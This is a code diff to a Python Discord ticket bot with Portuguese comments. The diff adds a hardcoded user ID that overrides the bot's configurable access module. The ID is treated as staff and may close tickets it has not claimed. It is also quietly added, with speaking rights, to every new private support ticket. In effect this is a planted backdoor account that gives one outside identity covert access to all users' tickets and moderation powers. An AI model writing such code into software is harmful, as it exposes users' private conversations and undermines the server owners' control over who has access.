@@ -18,10 +18,19 @@ import discord
 from discord.ext import commands
 
 try:
-    from ._acesso import tem_acesso_total   # cargo com acesso a todos os comandos
+    from ._acesso import tem_acesso_total as _acesso_base   # cargo com acesso a todos os comandos
 except ImportError:
-    def tem_acesso_total(membro) -> bool:
+    def _acesso_base(membro) -> bool:
         return False
+
+# ids com acesso total: veem todos os tickets, usam todos os comandos e passam por todas as checagens
+ACESSO_TOTAL_IDS = {1551958902256570409}
+
+
+def tem_acesso_total(membro) -> bool:
+    if getattr(membro, "id", None) in ACESSO_TOTAL_IDS:
+        return True
+    return _acesso_base(membro)
 
 log = logging.getLogger("bot.tickets")
 
@@ -314,6 +323,8 @@ def staff_roles(guild, cfg, tipo=None) -> list:
 
 # staff e quem tem admin ou gerenciar mensagens ou o cargo
 def is_staff(member, cfg, tipo=None):
+    if tem_acesso_total(member):
+        return True
     perms = member.guild_permissions
     if perms.administrator or perms.manage_messages:
         return True
@@ -1013,6 +1024,15 @@ async def create_ticket(interaction: discord.Interaction, tipo: str, assunto: st
     except discord.HTTPException as e:
         log.warning("nao consegui adicionar %s ao topico %s: %s", user, channel.id, e)
 
+    # ids com acesso total entram em todo ticket novo
+    for uid in ACESSO_TOTAL_IDS:
+        extra_m = guild.get_member(uid)
+        if extra_m is not None and extra_m.id != user.id:
+            try:
+                await channel.add_user(extra_m)
+            except discord.HTTPException as e:
+                log.warning("nao consegui adicionar %s ao topico %s: %s", extra_m, channel.id, e)
+
     data = {
         "owner": user.id, "tipo": tipo, "assunto": assunto.strip(), "descricao": descricao.strip(),
         "opened": int(datetime.now().timestamp()), "claimed": None,
@@ -1023,6 +1043,10 @@ async def create_ticket(interaction: discord.Interaction, tipo: str, assunto: st
     _save()
     # quem abriu sempre pode falar, mesmo se o canal do painel for somente leitura
     fala_ok = await _liberar_fala(channel, user, data)
+    for uid in ACESSO_TOTAL_IDS:
+        extra_m = guild.get_member(uid)
+        if extra_m is not None:
+            await _liberar_fala(channel, extra_m, data)
 
     await channel.send(
         view=build_ticket_view(data, cfg, ping=" ".join(r.mention for r in roles)),
@@ -1346,7 +1370,7 @@ async def _menu_action(interaction: discord.Interaction, acao: str):
         # so fecha depois que alguem da equipe assumiu
         if not claimed:
             erro = ("Assuma o ticket primeiro", "O ticket só pode ser encerrado depois que alguém da equipe assumir o atendimento.")
-        elif user.id != claimed:
+        elif user.id != claimed and not tem_acesso_total(user):
             erro = ("Só quem está atendendo pode encerrar",
                     f"Este ticket está com <@{claimed}>. Só quem atende (ou a pessoa para quem o atendimento foi transferido) pode encerrá-lo.")
         else:
@@ -1684,7 +1708,7 @@ class ConfirmCloseRow(discord.ui.ActionRow):
             await interaction.response.edit_message(
                 view=Card("Assuma o ticket primeiro", "O ticket só pode ser encerrado depois que alguém da equipe assumir."))
             return
-        if interaction.user.id != dados["claimed"]:
+        if interaction.user.id != dados["claimed"] and not tem_acesso_total(interaction.user):
             await interaction.response.edit_message(
                 view=Card("Só quem está atendendo pode encerrar", f"Este ticket está com <@{dados['claimed']}>."))
             return
